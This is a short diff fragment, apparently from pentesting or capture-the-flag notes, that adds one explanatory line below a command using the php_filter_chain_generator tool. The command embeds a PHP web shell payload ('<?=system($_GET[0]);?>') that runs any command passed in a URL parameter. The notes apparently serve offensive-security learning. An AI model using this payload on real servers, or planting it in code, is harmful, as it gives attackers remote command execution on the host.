@@ -332,5 +332,7 @@ https://github.com/synacktiv/php_filter_chain_generator
 ❯❯❯ python3 php_filter_chain_generator.py --chain '<?=system($_GET[0]);?>'
 ```
 
+This will inject the `0` as a parameter
+
 
 
